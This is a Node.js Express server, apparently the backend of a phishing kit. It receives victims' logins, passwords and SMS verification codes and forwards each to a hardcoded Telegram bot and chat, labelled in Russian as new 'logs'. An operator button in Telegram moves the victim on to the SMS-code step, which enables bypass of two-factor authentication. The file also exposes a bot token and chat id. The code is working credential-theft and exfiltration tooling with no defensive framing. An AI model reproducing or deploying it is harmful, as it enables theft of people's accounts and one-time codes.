const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const cors = require('cors');

const app = express();
const port = 5000;

app.use(cors());

const token = '7418959937:AAEqS6ir_yjuVEnP9d1fpIXEgy7IYSr1SD8';
const chatId = 7009012484;

const bot = new TelegramBot(token, {
    polling: true
});

app.use(express.json());


let pendingResponses = {};

app.post('/sendMessage', (req, res) => {
    const {
        login,
        pass,
        ip,
        sms,
        method
    } = req.body;

    if (method === 'sendLog') {
        if (!login || !pass) {
            return res.status(400).send('Login and Pass are required');
        }

        const geo = geoip.lookup(ip);
        const country = geo ? geo.country : 'Unknown';
        const msg = `Новый лог ✅\n\nСтрана: ${'UNKNOWN'} 🌎 \n\nIP: ${'UNKNOWN'} 🔥\n\nLogin: ${login} 👁️\n\nPass: ${pass} ℹ️`;

        const buttons = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{
                        text: 'Редирект на СМС',
                        callback_data: 'button1'
                    }]
                ]
            })
        };

        bot.sendMessage(chatId, msg, buttons)
            .then(() => {
                pendingResponses[login] = res;
                console.log('Message sent to Telegram');
            })
            .catch((error) => {
                console.error('Failed to send message:', error.response.body);
                res.status(500).send('Failed to send message');
            });


        bot.on('callback_query', (callbackQuery) => {
            const data = callbackQuery.data;
            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.message.chat.id;

            console.log(`Button "${data}" was pressed in Telegram bot`);

            if (data === 'button1') {
                console.log('Button 1 pressed!');
                if (pendingResponses[login]) {
                    pendingResponses[login].status(200).send('Success!');
                    delete pendingResponses[login];
                }
            }

            bot.answerCallbackQuery(callbackQuery.id)
                .then(() => {
                    console.log('Callback query answered');
                })
                .catch((error) => {
                    console.error('Failed to answer callback query:', error.response.body);
                });
        });
    } else {
        const msg = `СМС ✅\n\nLogin: ${login} 👁️\n\nPass: ${pass} ℹ️\n\n\n\nSMS: ${sms}`;
        bot.sendMessage(chatId, msg)
            .then(() => {
                pendingResponses[login] = res;
                console.log('Message sent to Telegram');
            })
            .catch((error) => {
                console.error('Failed to send message:', error.response.body);
                res.status(500).send('Failed to send message');
            });
    }
});
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});